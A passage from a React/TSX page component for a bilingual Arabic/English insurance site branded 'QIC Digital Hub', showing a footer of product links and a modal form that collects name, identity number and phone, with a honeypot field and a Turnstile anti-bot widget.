            </div>
          </div>
          <div className="footer-bottom">
            <a className="digital-link" href="#" onClick={(e) => e.preventDefault()}>{isAr ? "ضع حبك على QIC Digital Hub" : "Discover QIC Digital Hub"}</a>
            <div className="legal">
              {(isAr
                ? ["التأمين ضد الغير", "التأمين الشامل", "تأمين السفر إلى دول الخليج", "تأمين السفر إلى الولايات المتحدة", "تأمين السفر إلى أوروبا", "تأمين السفر إلى تركيا", "تأمين السفر إلى جورجيا", "تأمين السفر إلى الهند", "تأمين السفر إلى اليابان", "تأمين سيارات لويزيانا"]
                : ["Third-party insurance", "Comprehensive insurance", "Travel insurance to the Gulf", "Travel insurance to the USA", "Travel insurance to Europe", "Travel insurance to Turkey", "Travel insurance to Georgia", "Travel insurance to India", "Travel insurance to Japan", "Louisiana car insurance"]).map((l: string) => <a href="#" key={l} onClick={(e) => e.preventDefault()}>{l}</a>)}
            </div>
            <div className="copyright">{t.copyright}<br />{isAr ? "هذا الموقع محمي بموجب reCAPTCHA وتطبق عليه سياسة الخصوصية وشروط الخدمة من Google." : "This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply."}</div>
          </div>
        </footer>
      </main>

      {/* Insurance Modal */}
      {modalOpen && (
        <div className="insurance-modal" onClick={(e) => { if (e.target === e.currentTarget) closeInsuranceForm(); }}>
          <div className="insurance-dialog" role="dialog" aria-modal="true" aria-labelledby="form-title">
            <button className="form-close" type="button" aria-label="إغلاق" onClick={closeInsuranceForm}>×</button>
            <div className="form-heading">
              <h2 id="form-title">{t.formTitle}</h2>
              <p id="form-description">{t.formDesc}</p>
            </div>
            <form id="insurance-form" onSubmit={handleSubmit}>
              <div className="form-type">{modalHeading}</div>
              <div className="form-grid">
                <div className="form-field">
                  <label htmlFor="customer-name">{t.name}</label>
                  <input id="customer-name" name="name" type="text" autoComplete="name" value={ownerName} onChange={(e) => setOwnerName(e.target.value)} required />
                </div>
                <div className="form-field">
                  <label htmlFor="customer-id">{t.id}</label>
                  <input id="customer-id" name="identity" type="text" inputMode="numeric" value={identityNumber} onChange={(e) => setIdentityNumber(e.target.value.replace(/\D/g, "").slice(0, 10))} required />
                </div>
                <div className="form-field full">
                  <label htmlFor="customer-phone">{t.phone}</label>
                  <input id="customer-phone" name="phone" type="tel" inputMode="tel" autoComplete="tel" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, "").slice(0, 10))} required />
                </div>
                <div className="dynamic-fields">{renderDynamicFields()}</div>
              </div>

              <div style={{ display: "none" }} aria-hidden="true">
                <input type="text" name="website_url_hp" value={honeypot} onChange={(e) => setHoneypot(e.target.value)} tabIndex={-1} autoComplete="off" />
              </div>

              <div className="my-3 flex justify-center min-h-[65px]">
                <TurnstileWidget onVerify={(token) => setTurnstileToken(token)} />
              </div>

              <div className="form-actions">
                <button className="form-submit" type="submit">{t.continue}</button>
                <button className="form-cancel" type="button" onClick={closeInsuranceForm}>{t.cancel}</button>
              </div>
            </form>
          </div>
        </div>
      )}

      <div className={`site-toast${toast ? " is-visible" : ""}`} role="status" aria-live="polite">{toast}</div>
    </div>
  );
}